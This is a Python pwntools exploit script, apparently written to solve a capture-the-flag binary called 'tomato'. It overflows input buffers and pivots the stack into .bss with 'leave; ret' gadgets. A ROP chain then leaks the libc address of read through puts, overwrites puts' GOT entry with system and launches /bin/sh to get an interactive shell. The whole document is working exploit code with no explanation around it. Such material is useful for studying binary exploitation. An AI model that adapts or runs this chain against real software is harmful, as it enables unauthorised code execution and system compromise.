from pwn import *

pop_rdi = 0x400fa3 # pop rdi ; ret
pop_rsi = 0x400d84 # pop rsi ; ret
pop_rdx = 0x400d82 # pop rdx ; ret

leave_ret = 0x400D7C # leave ; ret

read_leave_ret_30 = 0x400D4C # have to recvuntil("GET OUT!\n")
read_leave_ret = 0x400D1A # have to set rsi, 0x50 byte

p = process("./tomato")
e = ELF("./tomato")

bss = e.bss() + 0x100

read_got = e.got["read"]
read_plt = e.plt["read"]

puts_got = e.got["puts"]
puts_plt = e.plt["puts"]

context.log_level = "debug"

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "1")
p.recvuntil("You : ")

pay = b""
pay += b"A" * 24
pay += p32(2)
p.send(pay)

p.sendlineafter("> ", "4")
p.recvuntil("explain : ")

pay = b""
pay += b"A" * 0x20
pay += p64(bss + 0x100) # sfp
pay += p64(read_leave_ret_30)
p.send(pay)

p.recvuntil('GET OUT!\n')

pay = b""
pay += p64(bss + 0x300) # fake sfp
pay += p64(pop_rsi) + p64(bss + 0x300 - 0x50) # going to go with bss + 0x300, but since we read by 50, read at bss + 0x300 - 0x50 address.
pay += p64(read_leave_ret)
pay += p64(bss + 0x100 - 0x20)
pay += p64(leave_ret)
p.send(pay)
p.recvuntil('GET OUT!\n')

pay = b""
pay += p64(bss + 0x400) # fake sfp
pay += p64(pop_rdi) + p64(read_got)
pay += p64(puts_plt)

pay += p64(pop_rsi) + p64(bss + 0x400 - 0x50) # going to go with bss + 0x300, but since we read by 50, read at bss + 0x300 - 0x50 address.
pay += p64(read_leave_ret)

pay += b"X" * (0x50 - len(pay))
pay += p64(bss + 0x300 - 0x50)
pay += p64(leave_ret)
p.send(pay)

read_arr = u64(p.recv(6) + b"\x00\x00")
libc_base = read_arr - 0xf7350
sys_arr = libc_base + 0x453a0
print(hex(sys_arr))

pay = b""
pay += b"A" * 0x8
pay += p64(pop_rsi) + p64(puts_got)
pay += p64(pop_rdi) + p64(0)
pay += p64(read_plt)

pay += p64(pop_rdi) + p64(puts_got + 8)
pay += p64(puts_plt)

pay += b"B" * (0x50 - len(pay))
pay += p64(bss + 0x400 - 0x50)
pay += p64(leave_ret)

p.send(pay)

p.send(p64(sys_arr) + b"/bin/sh\x00")

p.interactive()